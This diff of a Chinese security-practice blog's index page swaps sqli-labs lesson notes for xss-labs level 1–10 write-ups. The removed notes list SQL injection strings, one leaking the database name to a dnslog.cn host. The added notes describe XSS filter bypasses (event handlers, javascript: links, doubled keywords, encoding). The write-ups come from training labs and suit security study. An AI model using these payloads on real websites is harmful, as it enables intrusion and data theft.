@@ -64,10 +64,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-18" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-xss-labs实验笔记/xss-labs第10关" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-18/" class="article-date">
-  <time datetime="2022-03-31T16:27:15.802Z" itemprop="datePublished">2022-04-01</time>
+    <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC10%E5%85%B3/" class="article-date">
+  <time datetime="2022-04-20T13:21:26.939Z" itemprop="datePublished">2022-04-20</time>
 </a>
     
   </div>
@@ -78,7 +78,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-18/">sqli-labs-less-18</a>
+      <a class="article-title" href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC10%E5%85%B3/">xss-labs第10关</a>
     </h1>
   
 
@@ -86,15 +86,16 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>注入语句：’,1,updatexml(1,concat(0x7e, database(),0x7e),1))#</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson18/1.png"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson18/2.png"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson18/3.png"></p>
+        <p>1.对keyword提交poc，根据返回的源代码，过滤了尖括号，尝试编码不能绕过，无法构造事件触发xss、无法利用属性的javascript协议、无法利用css注入。</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC10%E5%85%B3/1.png"></p>
+<p> 2.详细查看源代码，可能有隐藏的表单，尝试提交t_link、t_history、t_sort变量，t_sort变量返回在了html的value中，尝试进行了绕过。构造poc：”type=”text” onclick=”alert(1)”，web浏览器成功执行 。ps:type=”text”为构造一个文本框，用来触发onclick事件</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC10%E5%85%B3/2.png"></p>
+<p> 3.后台源代码分析，获取了get请求的keyword变量、t_sort变量，t_sort变量过滤掉了尖括号，输出在value属性中</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-18/" data-id="cl1f7n02d0008q4tr2a2e5lc8" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC10%E5%85%B3/" data-id="cl27ltdnb0000f0trcudyf4k6" class="article-share-link">Share</a>
       
       
     </footer>
@@ -104,10 +105,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-17" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-xss-labs实验笔记/xss-labs第9关" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-17/" class="article-date">
-  <time datetime="2022-03-31T16:27:15.800Z" itemprop="datePublished">2022-04-01</time>
+    <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC9%E5%85%B3/" class="article-date">
+  <time datetime="2022-04-20T13:21:26.937Z" itemprop="datePublished">2022-04-20</time>
 </a>
     
   </div>
@@ -118,7 +119,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-17/">sqli-labs-less-17</a>
+      <a class="article-title" href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC9%E5%85%B3/">xss-labs第9关</a>
     </h1>
   
 
@@ -126,14 +127,15 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>注入语句：’ and (updatexml(1,concat(0x7e, database(),0x7e),1))#</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson17/2.png"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson17/3.png"></p>
+        <p> 1.采用第八关的poc，发现poc中应包含合法的url，poc中添加//<a target="_blank" rel="noopener" href="http://www.baidu.com,发现可以进行绕过/">http://www.baidu.com,发现可以进行绕过</a></p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC9%E5%85%B3/1.png"></p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC9%E5%85%B3/2.png"></p>
+<p>2.后台源代码分析。get提交的keyword变量，替换关键字script、on、src、data、href、”，判断该变量有无http://</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-17/" data-id="cl1f7n02d0007q4tr6ly78b61" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC9%E5%85%B3/" data-id="cl27ltdnr000af0trgtpsg6ig" class="article-share-link">Share</a>
       
       
     </footer>
@@ -143,10 +145,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-16" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-xss-labs实验笔记/xss-labs第8关" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-16/" class="article-date">
-  <time datetime="2022-03-31T16:27:15.799Z" itemprop="datePublished">2022-04-01</time>
+    <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC8%E5%85%B3/" class="article-date">
+  <time datetime="2022-04-20T13:21:26.935Z" itemprop="datePublished">2022-04-20</time>
 </a>
     
   </div>
@@ -157,7 +159,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-16/">sqli-labs-less-16</a>
+      <a class="article-title" href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC8%E5%85%B3/">xss-labs第8关</a>
     </h1>
   
 
@@ -165,13 +167,16 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>注入语句：admin”) and 1=1 – -</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson16/1.png"></p>
+        <p>1.利用href属性支持javascript:伪协议构造poc,javascript关键字被替换。尝试大小写，重复写，无法进行绕过。</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC8%E5%85%B3/2.png"></p>
+<p> 2.尝试对poc进行编码，可绕过</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC8%E5%85%B3/1.png"></p>
+<p>3.后台源代码分析。将keyword提交的变量转换为小写，替换关键字script、on、src、data、href、”，然后输出在a标签的href属性中。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-16/" data-id="cl1f7n02c0006q4tr5z70eada" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC8%E5%85%B3/" data-id="cl27ltdnq0009f0tr16uc95r0" class="article-share-link">Share</a>
       
       
     </footer>
@@ -181,10 +186,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-15" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-xss-labs实验笔记/xss-labs第7关" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-15/" class="article-date">
-  <time datetime="2022-03-31T16:27:15.796Z" itemprop="datePublished">2022-04-01</time>
+    <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC7%E5%85%B3/" class="article-date">
+  <time datetime="2022-04-20T13:21:26.933Z" itemprop="datePublished">2022-04-20</time>
 </a>
     
   </div>
@@ -195,7 +200,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-15/">sqli-labs-less-15</a>
+      <a class="article-title" href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC7%E5%85%B3/">xss-labs第7关</a>
     </h1>
   
 
@@ -203,13 +208,16 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>注入语句：admin’ and load_file(concat(“\\“,(database()),”.qyfyji.dnslog.cn\1.txt”)) –+</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson15/1.png"></p>
+        <p>1.构造poc，test” /&gt;<a href="javascript:alert(1)">a</a>//，根据返回的html，过滤了href和script。尝试大小写不能进行绕过。</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC7%E5%85%B3/1.png"></p>
+<p>2.尝试重复写test” /&gt;<a hrhrefef="javascscriptript:alert(1)">a</a>//，可以进行绕过触发poc</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC7%E5%85%B3/2.png"></p>
+<p>3.后台源代码分析。先将get方式提交的keyword变量通过strtolower转换为小写，将关键字script、on、src、data、href关键字替换成空，然后输出在html中</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-15/" data-id="cl1f7n02c0005q4tr1ra08zxl" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC7%E5%85%B3/" data-id="cl27ltdnr000bf0tr4ujnh04b" class="article-share-link">Share</a>
       
       
     </footer>
@@ -219,10 +227,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-14" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-xss-labs实验笔记/xss-labs第6关" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-14/" class="article-date">
-  <time datetime="2022-03-31T16:27:15.795Z" itemprop="datePublished">2022-04-01</time>
+    <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC6%E5%85%B3/" class="article-date">
+  <time datetime="2022-04-20T13:21:26.932Z" itemprop="datePublished">2022-04-20</time>
 </a>
     
   </div>
@@ -233,7 +241,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-14/">sqli-labs-less-14</a>
+      <a class="article-title" href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC6%E5%85%B3/">xss-labs第6关</a>
     </h1>
   
 
@@ -241,13 +249,14 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>注入语句：admin” union select updatexml(1,concat(0x7e,(select user()),0x7e),1) –+</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson14/1.png"></p>
+        <p>1.经测试替换了script，on，没有过滤&lt;&gt;。构造a标签，利用href属性支持javascript:伪协议构造poc，后台对href关键字进行替换，尝试采用大小写混写进行了绕过。</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC6%E5%85%B3/1.png"></p>
+<p>2.后台源代码分析。对get提交的keyword变量，替换&lt;script 、on、src、data、href关键字，采用htmlspecialchars过滤后输出在html中</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-14/" data-id="cl1f7n0280001q4trhnpo97ar" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC6%E5%85%B3/" data-id="cl27ltdnn0007f0tr2g3s1cjw" class="article-share-link">Share</a>
       
       
     </footer>
@@ -257,10 +266,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-20" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-xss-labs实验笔记/xss-labs第5关 " class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-20/" class="article-date">
-  <time datetime="2022-03-31T16:27:13.754Z" itemprop="datePublished">2022-04-01</time>
+    <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC5%E5%85%B3%20/" class="article-date">
+  <time datetime="2022-04-20T13:21:26.930Z" itemprop="datePublished">2022-04-20</time>
 </a>
     
   </div>
@@ -271,7 +280,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-20/">sqli-labs-less-20</a>
+      <a class="article-title" href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC5%E5%85%B3%20/">xss-labs第5关</a>
     </h1>
   
 
@@ -279,11 +288,18 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <p>1.构造事件 “ oninput=’alert(1)’，返回的html代码对on进行了过滤。尝试大小写，依然进行了过滤。尝试编码，不识别。</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC5%E5%85%B3/1.png"></p>
+<p> 2.尝试POC test”&gt;<script>alert</script>//,根据返回的html，后台对script进行了过滤，但是并未对尖括号进行过滤。</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC5%E5%85%B3/2.png"></p>
+<p>3.利用没有过滤尖括号，构造a标签再尝试利用a标签的href属性执行javascript:伪协议，”&gt;<a href='javascript:alert(1)'>,没有对javascript进行过滤，触发xss</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC5%E5%85%B3/3.png"></p>
+<p>4.后台源代码分析，对get提交的keyword变量，script替换成scr_ipt,on替换成o_n，htmlspecialchars函数过滤后，输出在html中</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-20/" data-id="cl1f7n02g000aq4tr1gx6707n" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC5%E5%85%B3%20/" data-id="cl27ltdno0008f0trg3ct932o" class="article-share-link">Share</a>
       
       
     </footer>
@@ -293,10 +309,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-19" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-xss-labs实验笔记/xss-labs第4关" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-19/" class="article-date">
-  <time datetime="2022-03-31T16:27:13.753Z" itemprop="datePublished">2022-04-01</time>
+    <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC4%E5%85%B3/" class="article-date">
+  <time datetime="2022-04-20T13:21:26.917Z" itemprop="datePublished">2022-04-20</time>
 </a>
     
   </div>
@@ -307,7 +323,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-19/">sqli-labs-less-19</a>
+      <a class="article-title" href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC4%E5%85%B3/">xss-labs第4关</a>
     </h1>
   
 
@@ -315,15 +331,16 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>注入语句： ‘,1,updatexml(1,concat(0x7e, database(),0x7e),1))#</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson19/1.png"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson19/2.png"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson19/3.png"></p>
+        <p>1.keyword提交<script>poc,根据后台返回的源代码，后台针对尖括号进行了过滤</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC4%E5%85%B3/1.png"></p>
+<p>2.构造事件onmouseover，构造语句闭合，成功执行javascript语句</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC4%E5%85%B3/2.png"></p>
+<p>3.后台源代码分析。对get请求的keyword变量，过滤掉尖括号，采用htmlspecialchars过滤后用echo直接输出在返回的html中。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-19/" data-id="cl1f7n02f0009q4tr46bt5f8b" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC4%E5%85%B3/" data-id="cl27ltdnn0006f0trcyhjf5ve" class="article-share-link">Share</a>
       
       
     </footer>
@@ -333,10 +350,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-13" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-xss-labs实验笔记/xss-labs第3关" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-13/" class="article-date">
-  <time datetime="2022-03-31T15:26:40.100Z" itemprop="datePublished">2022-03-31</time>
+    <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC3%E5%85%B3/" class="article-date">
+  <time datetime="2022-04-20T13:21:26.916Z" itemprop="datePublished">2022-04-20</time>
 </a>
     
   </div>
@@ -347,7 +364,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-13/">sqli-labs-less-13</a>
+      <a class="article-title" href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC3%E5%85%B3/">xss-labs第3关</a>
     </h1>
   
 
@@ -355,14 +372,17 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>注入语句：admin’) union select updatexml(1,concat(0x7e,(select user()),0x7e),1)  –+</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson13/1.png"></p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson13/2.png"></p>
+        <p>1.keyword提交”test&gt;<script>alert(1)</script>//构造闭合进行注入，根据返回的html代码，后台对尖括号进行了过滤</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC3%E5%85%B3/1.png"></p>
+<p>2.构造标签事件进行过滤，返回值实在input标签中，尝试构造onclick事件触发xss。点击输入框后，触发onclick事件，响应onclick中的javascript代码。</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC3%E5%85%B3/2.png"></p>
+<p>3.构造事件onmouseover，事件成功执行javascript:伪协议。</p>
+<p>4.后台源代码分析，采用htmlspecialchars函数对获取keyword变量进行过滤，输出在input标签的value中。htmlspecichars对尖括号进行了过滤。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-13/" data-id="cl1f7n02a0003q4tr0sof3yw5" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC3%E5%85%B3/" data-id="cl27ltdnm0005f0tr9grh041c" class="article-share-link">Share</a>
       
       
     </footer>
@@ -372,10 +392,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-11" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-xss-labs实验笔记/xss-labs第2关" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-11/" class="article-date">
-  <time datetime="2022-03-31T15:26:40.098Z" itemprop="datePublished">2022-03-31</time>
+    <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC2%E5%85%B3/" class="article-date">
+  <time datetime="2022-04-20T13:21:26.914Z" itemprop="datePublished">2022-04-20</time>
 </a>
     
   </div>
@@ -386,7 +406,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-11/">sqli-labs-less-11</a>
+      <a class="article-title" href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC2%E5%85%B3/">xss-labs第2关</a>
     </h1>
   
 
@@ -394,15 +414,18 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>注入语句：admin’ and 1=1 –+</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson11/1.png"></p>
-<p>这里不用密码也能登陆成功，所以判断是POST形式的单引号字符型注入</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson11/2.png"></p>
+        <p>1.利用name参数提交poc，查看返回的html代码，需要构造闭合</p>
+<p>2.构造闭合，浏览器响应poc。</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC2%E5%85%B3/1.png"></p>
+<p>3.后台源代码分析</p>
+<p>获取浏览器提交的keyword值，未进行过滤，输出在<input name=keyword value="'.$str.'">。</p>
+<p>如果是keyword提交的是<script>alert(xss)</script>,返回的就会是<input name=keyword value="<script>alert(1)</script>">,javascript引擎并不会执行<script>,所以需要构造闭合。</p>
+<p>keyword提交test”&gt;<script>alert(1)</script>//,php处理后返回的html就会是<input name=keyword value="test"> <script>alert(1)</script>//“&gt;，//是注释的作用，javascript引擎执行<script>alert(1)</script></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-11/" data-id="cl1f7n0220000q4tr5okp3nz8" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC2%E5%85%B3/" data-id="cl27ltdnk0003f0tr6jry2eom" class="article-share-link">Share</a>
       
       
     </footer>
@@ -412,10 +435,10 @@
 
 
   
-    <article id="post-sqli-labs实验笔记/sqli-labs-less-12" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-xss-labs实验笔记/xss-labs第1关" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-12/" class="article-date">
-  <time datetime="2022-03-31T15:26:40.097Z" itemprop="datePublished">2022-03-31</time>
+    <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC1%E5%85%B3/" class="article-date">
+  <time datetime="2022-04-20T13:21:26.912Z" itemprop="datePublished">2022-04-20</time>
 </a>
     
   </div>
@@ -426,7 +449,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-12/">sqli-labs-less-12</a>
+      <a class="article-title" href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC1%E5%85%B3/">xss-labs第1关</a>
     </h1>
   
 
@@ -434,13 +457,15 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>注入语句：admin”) and 1=1 –+</p>
-<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson12/1.png"></p>
+        <p>1.点击图片完成get请求，提交name变量test，完整的显示在返回的页面源代码中。</p>
+<p>2.get请求的name变量放入xss poc，完整返回在html中，浏览器响应xss poc。</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/XSS/%E7%AC%AC1%E5%85%B3/1.png"></p>
+<p>3.后台代码分析，通过$_GET[“name”]，获取name的值，没有过滤通过echo直接进行了输出</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-12/" data-id="cl1f7n02b0004q4trdq7y0nl1" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC1%E5%85%B3/" data-id="cl27ltdnk0004f0tr1sk62hdi" class="article-share-link">Share</a>
       
       
     </footer>
@@ -454,7 +479,7 @@
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
   </nav>
 
 </section>
@@ -486,23 +511,23 @@
       <ul>
         
           <li>
-            <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-18/">sqli-labs-less-18</a>
+            <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC10%E5%85%B3/">xss-labs第10关</a>
           </li>
         
           <li>
